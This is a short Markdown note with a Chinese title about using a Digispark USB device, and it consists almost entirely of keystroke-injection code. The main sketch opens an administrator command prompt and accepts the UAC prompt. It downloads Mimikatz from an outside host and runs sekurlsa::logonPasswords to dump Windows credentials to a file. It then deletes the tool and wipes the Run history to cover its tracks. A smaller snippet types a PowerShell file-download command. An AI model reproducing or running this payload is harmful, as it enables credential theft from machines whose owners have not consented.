# Digispark 使用
```cpp
Keyboard.press(KEY_LEFT_CTRL);//下载文件
Keyboard.press(KEY_ESC);
Keyboard.releaseAll();
Keyboard.print("powershell");
Keyboard.press(KEY_RETURN);
Keyboard.print("(new-objectSystem.Net.WebClient).DownloadFile('http://www.example.com/example.html','d:lalala.html')");
```
```cpp
#include "DigiKeyboard.h" void setup() { // put your setup code here, to run once: 
DigiKeyboard.delay(3000); // 开机延迟3秒钟，用于系统识别Digispark 
DigiKeyboard.sendKeyStroke(0); 
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // 按R和win键，打开运行 
DigiKeyboard.delay(100); // 以管理员身份开启CMD窗口 
DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); // 按住左SHIFT，绕过输入法 DigiKeyboard.println("powershell Start-Process cmd -Verb runAs"); DigiKeyboard.sendKeyPress(0); // 松开 DigiKeyboard.sendKeyStroke(KEY_ENTER); // 按回车 DigiKeyboard.delay(3000); DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); DigiKeyboard.delay(1000); // 下载Mimikatz DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); DigiKeyboard.println("powershell if ([System.IntPtr]::Size -eq 4){(new-object System.Net.WebClient).DownloadFile('https://git.laucyun.com/myweb/blog-files/raw/master/mimikatz/x86/mimikatz.exe','C:\\pw.exe');}else{(new-object System.Net.WebClient).DownloadFile('https://git.laucyun.com/myweb/blog-files/raw/master/mimikatz/x64/mimikatz.exe','C:\\pw.exe');}"); DigiKeyboard.sendKeyPress(0); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.delay(5000); // 运行Mimikatz DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); DigiKeyboard.println("C:\\pw.exe > C:\\pwlog.txt"); DigiKeyboard.delay(1000); DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); DigiKeyboard.println("privilege::debug"); // 执行privilege::debug命令 DigiKeyboard.sendKeyPress(0); DigiKeyboard.delay(500); DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); DigiKeyboard.println("sekurlsa::logonPasswords full"); // 执行sekurlsa::logonpasswords命令 DigiKeyboard.sendKeyPress(0); DigiKeyboard.delay(1000); DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); DigiKeyboard.println("exit"); DigiKeyboard.sendKeyPress(0); DigiKeyboard.delay(300); // 删除Mimikatz DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); DigiKeyboard.println("DEL C:\\pw.exe"); DigiKeyboard.sendKeyPress(0); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.delay(300); // 利用注册表清除`开始->运行`的记录 DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f"); DigiKeyboard.sendKeyPress(0); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.delay(500); // 退出CMD窗口，并打开文件 DigiKeyboard.sendKeyPress(MOD_SHIFT_LEFT); DigiKeyboard.println("notepad C:\\pwlog.txt && exit"); DigiKeyboard.sendKeyPress(0); DigiKeyboard.delay(500); } void loop() { // put your main code here, to run repeatedly: }
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTEyMzcxMDU1ODEsNjk5Nzk1MDU5XX0=
-->